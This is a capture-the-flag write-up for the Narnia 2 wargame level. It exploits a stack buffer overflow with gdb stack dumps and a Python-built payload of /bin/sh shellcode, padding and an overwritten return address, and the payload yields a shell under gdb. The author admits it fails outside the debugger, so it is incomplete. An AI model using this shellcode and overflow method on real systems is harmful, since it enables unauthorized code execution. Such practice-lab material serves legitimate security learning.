# Solution for Narnia 2

We analyze the code and we see that the buffer size is 128 bytes. 
There is only the buffer in the local variables, so the stack structure is 

| buffer         | old_ebp | ret_addr|

So if we send the input of 132 bytes, we can overwrite old ebp and send ourselves a return address

## Proof of concept 
Let's craft the payload and send it 
```text
narnia2@narnia:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r `python -c 'print "A"*132 + "BBBB"'`
Starting program: /narnia/narnia2 `python -c 'print "A"*132 + "BBBB"'`

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Yup, now let's send an address that hits the shellcode

## The exploit
First, we need to find where on stack the address is 
We need to check if we need to use ROP gadgets or if we can use direct addresses.
Check if ASLR is enabled or not
```text
narnia2@narnia:/narnia$ cat /proc/sys/kernel/randomize_va_space
0
```

Perfect! We can send direct addresses to the payload
Now let's find the shellcode
I set a breakpoint before the strcpy instruction executes. Now I analyze the stack and find my 41414141
```text
(gdb) x/200wx $ebp
0xffffd638:     0x00000000      0xf7e2a286      0x00000002      0xffffd6d4
0xffffd648:     0xffffd6e0      0x00000000      0x00000000      0x00000000
0xffffd658:     0xf7fc5000      0xf7ffdc0c      0xf7ffd000      0x00000000
0xffffd668:     0x00000002      0xf7fc5000      0x00000000      0x8a753f0a
0xffffd678:     0xb09d331a      0x00000000      0x00000000      0x00000000
0xffffd688:     0x00000002      0x08048350      0x00000000      0xf7fee710
0xffffd698:     0xf7e2a199      0xf7ffd000      0x00000002      0x08048350
0xffffd6a8:     0x00000000      0x08048371      0x0804844b      0x00000002
0xffffd6b8:     0xffffd6d4      0x080484a0      0x08048500      0xf7fe9070
0xffffd6c8:     0xffffd6cc      0xf7ffd920      0x00000002      0xffffd804
0xffffd6d8:     0xffffd814      0x00000000      0xffffd89d      0xffffd8b0
0xffffd6e8:     0xffffde6c      0xffffdea1      0xffffdeb0      0xffffdec1
0xffffd6f8:     0xffffded6      0xffffdee3      0xffffdeef      0xffffdef8
0xffffd708:     0xffffdf0b      0xffffdf2d      0xffffdf40      0xffffdf4c
0xffffd718:     0xffffdf63      0xffffdf73      0xffffdf87      0xffffdf92
0xffffd728:     0xffffdf9a      0xffffdfaa      0x00000000      0x00000020
0xffffd738:     0xf7fd7c90      0x00000021      0xf7fd7000      0x00000010
0xffffd748:     0x178bfbff      0x00000006      0x00001000      0x00000011
0xffffd758:     0x00000064      0x00000003      0x08048034      0x00000004
0xffffd768:     0x00000020      0x00000005      0x00000008      0x00000007
0xffffd778:     0xf7fd9000      0x00000008      0x00000000      0x00000009
0xffffd788:     0x08048350      0x0000000b      0x000036b2      0x0000000c
0xffffd798:     0x000036b2      0x0000000d      0x000036b2      0x0000000e
0xffffd7a8:     0x000036b2      0x00000017      0x00000001      0x00000019
0xffffd7b8:     0xffffd7eb      0x0000001a      0x00000000      0x0000001f
0xffffd7c8:     0xffffdfe8      0x0000000f      0xffffd7fb      0x00000000
0xffffd7d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd7e8:     0x5a000000      0xdf06f8c5      0xc97abaec      0xcaec24ac
0xffffd7f8:     0x698a375a      0x00363836      0x00000000      0x72616e2f
0xffffd808:     0x2f61696e      0x6e72616e      0x00326169      0x41414141
0xffffd818:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd828:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd838:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd848:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd858:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd868:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd878:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd888:     0x41414141      0x41414141      0x41414141      0x41414141
```

We have found it at 0xffffd814
We use it in the payload
```text
python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*108 + "\x14\xd8\xff\xff"'
```

Cool, we get shell. I can only get it to run in gdb though
```text
narnia2@narnia:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*108 + "\x14\xd8\xff\xff"')
Starting program: /narnia/narnia2 $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*108 + "\x14\xd8\xff\xff"')
process 7373 is executing new program: /bin/dash
$ 
```
I don't know why it isn't working outside gdb, and at this point, I don't have the time to figure out why, because the addresses are hitting

Even if i put in the NOP sled beforehand, I'm not able to hit the address of shell. So maybe I'm doing something wrong here

```text
narnia2@narnia:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) $(python -c 'print "\x90"*108 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x24\xd8\xff\xff"')
Undefined command: "$".  Try "help".
(gdb) r $(python -c 'print "\x90"*108 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x24\xd8\xff\xff"')
Starting program: /narnia/narnia2 $(python -c 'print "\x90"*108 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x24\xd8\xff\xff"')
process 7433 is executing new program: /bin/dash
$ 
```
I'm getting a segmentation fault here

